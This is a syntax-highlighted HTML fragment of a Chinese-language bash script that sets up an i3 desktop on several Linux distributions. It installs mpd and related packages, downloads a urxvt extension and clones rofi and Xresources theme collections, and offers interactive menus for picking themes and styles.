class="hljs-string">&quot;已经克隆过代码，是否重新克隆?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> --recursive <span class="hljs-variable">$url</span> <span class="hljs-variable">$tmp_path</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;克隆代码失败!稍后再重试!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br><br>    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -p <span class="hljs-string">&quot;`echo_green &#x27;输入安装目录,默认 /usr/local :&#x27;`&quot;</span> str_dst<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_dst=<span class="hljs-string">&quot;/usr/local&quot;</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置的安装目录前缀不存在! [<span class="hljs-variable">$str_dst</span>]&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    <span class="hljs-comment"># read -t $READ_TIMEOUT -p &quot;`echo_green &#x27;选择代码分支 master/stable,默认master:&#x27;`&quot; str_branch</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_branch</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_branch=<span class="hljs-string">&quot;master&quot;</span><br><br>    install_build_deps<br>    install_mpd_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; git checkout <span class="hljs-variable">$str_branch</span> &amp;&amp; meson setup build --prefix=<span class="hljs-variable">$&#123;str_dst&#125;</span> &amp;&amp;  ninja -C build &amp;&amp; sudo ninja -C build install<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_others</span></span>() &#123;<br>    <span class="hljs-comment"># 使用命令安装 psmisc(killall)</span><br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install -y feh variety dunst rxvt-unicode x11-xserver-utils mpc ncmpcpp firefox-esr psmisc pulseaudio thunar pamixer neovim<br>    <span class="hljs-comment"># fedora 没有提供mpd安装包(涉及到h264编解码器专利原因),需要替换ffmpeg相关库</span><br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo yum install --nogpgcheck https://mirrors.tuna.tsinghua.edu.cn/rpmfusion/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://mirrors.tuna.tsinghua.edu.cn/rpmfusion/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo sed -i <span class="hljs-string">&#x27;s|^metalink=|#metalink=|g;s|^#baseurl=http://download1.rpmfusion.org/|baseurl=https://mirrors.tuna.tsinghua.edu.cn/rpmfusion/|g&#x27;</span> /etc/yum.repos.d/rpmfusion*.repo &amp;&amp; sudo dnf install --allowerasing -y mpd<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf     install -y feh variety dunst rxvt-unicode xrandr mpc ncmpcpp firefox psmisc thunar pamixer neovim<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper  install -y feh variety dunst rxvt-unicode xrandr mpd mpclient ncmpcpp MozillaFirefox psmisc thunar pamixer neovim<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed feh variety dunst rxvt-unicode xorg-xrandr mpc ncmpcpp firefox psmisc thunar noto-fonts jack2 pamixer neovim<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_urxvt_ext</span></span>() &#123;<br>    ext_path=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.urxvt/ext&quot;</span><br>    [[ -r <span class="hljs-string">&quot;<span class="hljs-variable">$ext_path</span>&quot;</span> ]] || <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$ext_path</span><br>    url=<span class="hljs-string">&quot;https://raw.githubusercontent.com/majutsushi/urxvt-font-size/master/font-size&quot;</span><br>    curl -o <span class="hljs-variable">$ext_path</span>/font-size <span class="hljs-variable">$url</span><br><br>&#125;<br><span class="hljs-comment"># 主题选择工具,选择结果保存在 select_theme 变量中</span><br><span class="hljs-comment"># 用法 common_select &lt;theme_dir&gt; &lt;prefix_str&gt;</span><br><span class="hljs-comment"># theme_dir ： 用于列举子目录下的选项</span><br><span class="hljs-comment"># prefix_str : 用于过滤条件，比如只希望包含.ini的文件列表就可以设置为 &quot;.ini&quot;</span><br><span class="hljs-comment"># 输入表达式说明： 支持正则匹配，例如 ^abc$ 就只会匹配 abc 字符串，因为输入内容会作为grep的匹配表达式.</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">common_select</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> theme_dir=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <span class="hljs-built_in">local</span> prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>    <span class="hljs-built_in">local</span> current_input=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">local</span> exit_loop=<span class="hljs-literal">false</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入<span class="hljs-variable">$&#123;prefix&#125;</span>名称:&quot;</span><br>    <span class="hljs-keyword">while</span> ! <span class="hljs-variable">$exit_loop</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -r -s -n 1 char<br><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$char</span> == $<span class="hljs-string">&#x27;\177&#x27;</span> ]]; <span class="hljs-keyword">then</span> <span class="hljs-comment"># 退格键</span><br>            current_input=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input%?&#125;</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$char</span>&quot;</span> == <span class="hljs-string">&#x27;&#x27;</span> ]]; <span class="hljs-keyword">then</span> <span class="hljs-comment"># 输入为空时表示结束输入</span><br>            exit_loop=<span class="hljs-literal">true</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-comment"># 将输入的字符追加到当前目录</span><br>            current_input=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input&#125;</span><span class="hljs-variable">$&#123;char&#125;</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br><br>        <span class="hljs-comment"># 清除当前行并显示新内容</span><br>        tput ed  &amp;&amp; <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;\r输入<span class="hljs-variable">$&#123;prefix&#125;</span>名称: <span class="hljs-variable">$&#123;current_input&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input&#125;</span>&quot;</span> == <span class="hljs-string">&quot;random&quot;</span> ]] ; <span class="hljs-keyword">then</span>  <span class="hljs-comment"># 随机选择一个主题</span><br>            maxn=`<span class="hljs-built_in">ls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$theme_dir</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$prefix</span>&quot;</span>|<span class="hljs-built_in">wc</span> -l`<br>            str_rand=<span class="hljs-string">&quot;<span class="hljs-subst">$(($RANDOM%$&#123;maxn&#125;)</span>)&quot;</span><br>            selected_theme=`<span class="hljs-built_in">ls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$theme_dir</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$prefix</span>&quot;</span> |sed -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;str_rand&#125;</span>p&quot;</span>`<br>            <span class="hljs-built_in">break</span><br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-comment"># 保存当前光标位置</span><br>        tput sc<br>        <span class="hljs-comment"># 将光标移动到最后一行</span><br>        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;  &gt;&gt;&quot;</span><br>        <span class="hljs-comment"># 列出匹配的文件和目录,仅显示前10条</span><br>        selected_theme=$(<span class="hljs-built_in">ls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$theme_dir</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$prefix</span>&quot;</span> | grep -m 1 <span class="hljs-string">&quot;<span class="hljs-variable">$current_input</span>&quot;</span>)<br>        <span class="hljs-built_in">ls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$theme_dir</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$prefix</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$current_input</span>&quot;</span> | <span class="hljs-built_in">head</span> -10 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r entry; <span class="hljs-keyword">do</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot; <span class="hljs-variable">$entry</span>&quot;</span><br>        <span class="hljs-keyword">done</span><br>        <span class="hljs-comment"># 恢复光标位置</span><br>        tput rc<br>    <span class="hljs-keyword">done</span><br><br>    selected_theme=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme//[$&#x27;\t\r\n &#x27;]&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span><br>    tput ed<br>    prompt <span class="hljs-string">&quot;您的<span class="hljs-variable">$&#123;prefix&#125;</span>选择为: <span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span> || selected_theme=<span class="hljs-string">&quot;&quot;</span><br>&#125;<br><span class="hljs-comment"># 主题选择工具,选择结果保存在 select_theme 变量中</span><br><span class="hljs-comment"># 用法 common_list_select &lt;data_list&gt; &lt;prompt&gt;</span><br><span class="hljs-comment"># data_list : 数据列表，一行一个选项</span><br><span class="hljs-comment"># prompt : 提示符，仅用于提示，无其他用途</span><br><span class="hljs-comment"># 输入表达式说明： 支持正则匹配，例如 ^abc$ 就只会匹配 abc 字符串，因为输入内容会作为grep的匹配表达式.</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">common_list_select</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> data_list=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <span class="hljs-built_in">local</span> prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>    <span class="hljs-built_in">local</span> current_input=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">local</span> exit_loop=<span class="hljs-literal">false</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入<span class="hljs-variable">$&#123;prefix&#125;</span>名称:&quot;</span><br>    <span class="hljs-keyword">while</span> ! <span class="hljs-variable">$exit_loop</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -r -s -n 1 char<br><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$char</span> == $<span class="hljs-string">&#x27;\177&#x27;</span> ]]; <span class="hljs-keyword">then</span> <span class="hljs-comment"># 退格键</span><br>            current_input=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input%?&#125;</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$char</span>&quot;</span> == <span class="hljs-string">&#x27;&#x27;</span> ]]; <span class="hljs-keyword">then</span> <span class="hljs-comment"># 输入为空时表示结束输入</span><br>            exit_loop=<span class="hljs-literal">true</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-comment"># 将输入的字符追加到当前目录</span><br>            current_input=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input&#125;</span><span class="hljs-variable">$&#123;char&#125;</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br><br>        <span class="hljs-comment"># 清除当前行并显示新内容</span><br>        tput ed  &amp;&amp; <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;\r输入<span class="hljs-variable">$&#123;prefix&#125;</span>名称: <span class="hljs-variable">$&#123;current_input&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;current_input&#125;</span>&quot;</span> == <span class="hljs-string">&quot;random&quot;</span> ]] ; <span class="hljs-keyword">then</span>  <span class="hljs-comment"># 随机选择一个主题</span><br>            maxn=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$data_list</span>&quot;</span> |<span class="hljs-built_in">wc</span> -l`<br>            str_rand=<span class="hljs-string">&quot;<span class="hljs-subst">$(($RANDOM%$&#123;maxn&#125;)</span>)&quot;</span><br>            selected_theme=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$data_list</span>&quot;</span> |sed -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;str_rand&#125;</span>p&quot;</span>`<br>            <span class="hljs-built_in">break</span><br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-comment"># 保存当前光标位置</span><br>        tput sc<br>        <span class="hljs-comment"># 将光标移动到最后一行</span><br>        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;  &gt;&gt;&quot;</span><br>        <span class="hljs-comment"># 列出匹配的文件和目录,仅显示前10条</span><br>        selected_theme=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$data_list</span>&quot;</span> | grep -m 1 <span class="hljs-string">&quot;<span class="hljs-variable">$current_input</span>&quot;</span>)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$data_list</span>&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$current_input</span>&quot;</span> | <span class="hljs-built_in">head</span> -10 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r entry; <span class="hljs-keyword">do</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot; <span class="hljs-variable">$entry</span>&quot;</span><br>        <span class="hljs-keyword">done</span><br>        <span class="hljs-comment"># 恢复光标位置</span><br>        tput rc<br>    <span class="hljs-keyword">done</span><br><br>    selected_theme=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme//[$&#x27;\t\r\n &#x27;]&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span><br>    tput ed<br>    prompt <span class="hljs-string">&quot;您的<span class="hljs-variable">$&#123;prefix&#125;</span>选择为: <span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span> || selected_theme=<span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">select_xresources_themes</span></span>() &#123;<br>    <span class="hljs-comment"># tput clear</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;配置 ~/.Xresources 主题&quot;</span><br>    tmp_path=~/.config/Xresources-themes<br>    [[ -r <span class="hljs-variable">$tmp_path</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;已经拷贝过 Xresources-themes 了，是否重新拷贝?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$tmp_path</span><br>    [[ -r <span class="hljs-variable">$tmp_path</span> ]] || git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/janoamaral/Xresources-themes <span class="hljs-variable">$tmp_path</span><br><br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br><br>    menu_head <span class="hljs-string">&quot;Xresources-themes主题(大量主题集合):&quot;</span><br>    menu_iteml base16   <span class="hljs-string">&quot;166个 base16 主题&quot;</span><br>    menu_iteml iterm2   <span class="hljs-string">&quot;162个 iterm2 主题&quot;</span><br>    menu_iteml xcolors  <span class="hljs-string">&quot;113个 xcolors 主题&quot;</span><br>    menu_iteml raven    <span class="hljs-string">&quot;8个 raven 主题&quot;</span><br>    menu_iteml nord     <span class="hljs-string">&quot;1个 nord 主题&quot;</span><br>    menu_iteml arcadia  <span class="hljs-string">&quot;6个 arcadia 主题&quot;</span><br>    menu_iteml hyper    <span class="hljs-string">&quot;2个 hyper 主题&quot;</span><br>    menu_iteml random   <span class="hljs-string">&quot;random 随机一个主题&quot;</span><br>    menu_iteml <span class="hljs-string">&quot;推荐: nord&quot;</span><br>    menu_tail<br>    <br>    common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> <span class="hljs-string">&quot;&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$select_theme</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; select_theme=<span class="hljs-string">&quot;nord&quot;</span><br>    sed -E -i <span class="hljs-string">&quot;s|^(#include \&quot;.config/Xresources-themes/)(.*)\&quot;|\1<span class="hljs-variable">$&#123;selected_theme&#125;</span>\&quot;|g&quot;</span> ~/.Xresources<br>    xrdb ~/.Xresources &amp;&amp; i3-msg restart<br>    menu_iteml <span class="hljs-string">&quot;成功切换为 <span class="hljs-variable">$selected_theme</span> 主题&quot;</span><br>    menu_tail<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">select_rofi_themes</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 rofi themes&quot;</span><br>    tmp_path=~/.config/rofi_themes<br>    [[ -r <span class="hljs-variable">$tmp_path</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;已经拷贝过 rofi-themes 了，是否重新拷贝?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$tmp_path</span><br>    <span class="hljs-keyword">if</span> [[ ! -r <span class="hljs-variable">$tmp_path</span> ]] ; <span class="hljs-keyword">then</span><br>        git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/switchToLinux/rofi_collection.git <span class="hljs-variable">$tmp_path</span><br>        <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; bash ./setup.sh &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 rofi themes 成功&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    tmp_path=~/.config/rofi<br>    <span class="hljs-comment">#选择rofi主题(Applet/Launcher/Powermenus)</span><br>    menu_head <span class="hljs-string">&quot;rofi-themes主题(大量主题集合):&quot;</span><br>    menu_iteml launchers   <span class="hljs-string">&quot;启动器主题&quot;</span><br>    menu_iteml applets    <span class="hljs-string">&quot;小插件主题&quot;</span><br>    menu_iteml <span class="hljs-string">&quot;推荐: 根据官网 https://github.com/adi1090x/rofi 示例进行选择适合自己的主题&quot;</span><br>    menu_iteml <span class="hljs-string">&quot;提示:将替换 \$mod+d 快捷键对应执行命令为启动器脚本&quot;</span><br>    menu_iteml <span class="hljs-string">&quot;提示:将替换 \$mod+shift+l 快捷键对应执行命令为powermenu&quot;</span><br>    menu_tail<br><br>    <span class="hljs-keyword">if</span> prompt <span class="hljs-string">&quot;选择 启动器:&quot;</span> ; <span class="hljs-keyword">then</span><br>        menu_head <span class="hljs-string">&quot;提示&quot;</span> <span class="hljs-string">&quot;样式比较多，很难一一描述,仅列举常用几个&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-1/style-10&quot;</span> <span class="hljs-string">&quot;水平顶部条状布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2/style-6&quot;</span> <span class="hljs-string">&quot;垂直靠左布局，类似侧边栏效果&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-3/style-9&quot;</span> <span class="hljs-string">&quot;垂直靠右布局，类似侧边栏效果&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4/style-10&quot;</span> <span class="hljs-string">&quot;垂直靠右布局，类似侧边栏效果&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-5/style-3&quot;</span> <span class="hljs-string">&quot;垂直居中布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-6/style-5&quot;</span> <span class="hljs-string">&quot;垂直居中布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-7/style-4&quot;</span> <span class="hljs-string">&quot;垂直靠左布局，类似侧边栏效果&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/launchers&quot;</span> <span class="hljs-string">&quot;type&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        theme_name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$theme_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; theme_name=<span class="hljs-string">&quot;type-3&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/launchers/<span class="hljs-variable">$&#123;theme_name&#125;</span>/&quot;</span> <span class="hljs-string">&quot;style&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        style_name=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> | sed <span class="hljs-string">&#x27;s/.rasi//g&#x27;</span>`<br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$style_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; style_name=<span class="hljs-string">&quot;style-1&quot;</span><br><br>        <span class="hljs-comment">#sed -i &quot;s|^bindsym \$mod+d exec.*|bindsym \$mod+d exec --no-startup-id  ~/.config/rofi/launchers/$&#123;theme_name&#125;/launcher.sh|g&quot; ~/.config/i3/config ~/.config/i3/config.d/*</span><br>        sed -i <span class="hljs-string">&quot;s|^theme=&#x27;style.*&#x27;|theme=&#x27;<span class="hljs-variable">$&#123;style_name&#125;</span>&#x27;|g&quot;</span> ~/.config/rofi/launchers/<span class="hljs-variable">$&#123;theme_name&#125;</span>/launcher.sh<br>        <span class="hljs-built_in">cd</span> ~/.config/rofi/scripts &amp;&amp; <span class="hljs-built_in">ln</span> -sf ../launchers/<span class="hljs-variable">$&#123;theme_name&#125;</span>/launcher.sh launcher<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> prompt <span class="hljs-string">&quot;选择 applets:&quot;</span> ; <span class="hljs-keyword">then</span><br>        menu_head <span class="hljs-string">&quot;选择 applets 类型(默认type-3):&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-1&quot;</span> <span class="hljs-string">&quot;垂直方向显示，图标+文字,居中显示&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2&quot;</span> <span class="hljs-string">&quot;水平显示内容，图标，居中显示&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-3&quot;</span> <span class="hljs-string">&quot;垂直方向显示, 仅图标,靠右侧边缘显示&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4&quot;</span> <span class="hljs-string">&quot;水平显示内容，图标，居中显示,顶部有空白显示区域&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-5&quot;</span> <span class="hljs-string">&quot;垂直显示内容，图标+文字，居中显示,左侧有空白显示区域&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/applets&quot;</span> <span class="hljs-string">&quot;type&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        theme_name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$theme_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; theme_name=<span class="hljs-string">&quot;type-3&quot;</span><br>        menu_head <span class="hljs-string">&quot;选择 applets 样式(默认style-1):&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;style-1&quot;</span> <span class="hljs-string">&quot;无圆角类型，按钮长方形&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;style-2&quot;</span> <span class="hljs-string">&quot;小弧度圆角类型，按钮长方形&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;style-3&quot;</span> <span class="hljs-string">&quot;大弧度圆角类型，按钮椭圆形&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/applets/<span class="hljs-variable">$&#123;theme_name&#125;</span>/&quot;</span> <span class="hljs-string">&quot;style&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        style_name=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> | sed <span class="hljs-string">&#x27;s/.rasi//g&#x27;</span>`<br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$style_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; style_name=<span class="hljs-string">&quot;style-1&quot;</span><br>        <span class="hljs-comment"># change theme  type=&quot;$HOME/.config/rofi/applets/type-1&quot; # style=&#x27;style-1.rasi&#x27;</span><br>        sed -E -i <span class="hljs-string">&quot;s|config/rofi/applets/type-([0-9]+)|config/rofi/applets/<span class="hljs-variable">$&#123;theme_name&#125;</span>|g;s|=&#x27;style-([0-9]+).rasi|=&#x27;<span class="hljs-variable">$&#123;style_name&#125;</span>.rasi|g&quot;</span> ~/.config/rofi/applets/shared/theme.bash<br>        menu_head <span class="hljs-string">&quot;选择 applets 颜色方案(默认为 nord):&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/colors&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        color_name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$color_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; color_name=<span class="hljs-string">&quot;nord.rasi&quot;</span><br>        <br>        <span class="hljs-comment"># change color @import &quot;~/.config/rofi/colors/onedark.rasi&quot;</span><br>        sed -E -i <span class="hljs-string">&quot;s|config/rofi/colors/(.*.rasi)|config/rofi/colors/<span class="hljs-variable">$&#123;color_name&#125;</span>|g&quot;</span> ~/.config/rofi/applets/shared/colors.rasi<br>        menu_iteml <span class="hljs-string">&quot;切换 applets 为 <span class="hljs-variable">$theme_name</span> 主题, <span class="hljs-variable">$&#123;style_name&#125;</span> 类型, <span class="hljs-variable">$&#123;color_name&#125;</span> 颜色方案&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> prompt <span class="hljs-string">&quot;选择 powermenu:&quot;</span> ; <span class="hljs-keyword">then</span><br>        menu_head <span class="hljs-string">&quot;选择 powermenu 主题类型(默认 type-4)&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-1&quot;</span> <span class="hljs-string">&quot;居中显示，图标+文字&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2&quot;</span> <span class="hljs-string">&quot;居中显示，仅图标&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-3&quot;</span> <span class="hljs-string">&quot;全屏显示，垂直布局，黑色背景&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4&quot;</span> <span class="hljs-string">&quot;全屏显示，水平布局，渐变色背景&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-5&quot;</span> <span class="hljs-string">&quot;居中显示，水平布局，顶部有空白显示区域&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-6&quot;</span> <span class="hljs-string">&quot;居中显示，垂直布局，左侧有空白显示区域&quot;</span><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/powermenu&quot;</span> <span class="hljs-string">&quot;type&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        theme_name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$theme_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; theme_name=<span class="hljs-string">&quot;type-3&quot;</span><br>        menu_head <span class="hljs-string">&quot;选择 powermenu <span class="hljs-variable">$theme_name</span> 的样式(默认为type-4,style-5)&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;提示&quot;</span> <span class="hljs-string">&quot;不同type下样式无法归类描述,仅列举典型描述&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-1,style-4 居中显示，按钮垂直布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-1,style-5 居中显示，按钮水平布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2,style-4 垂直靠右布局&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2,style-5 垂直靠左布局，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2,style-6 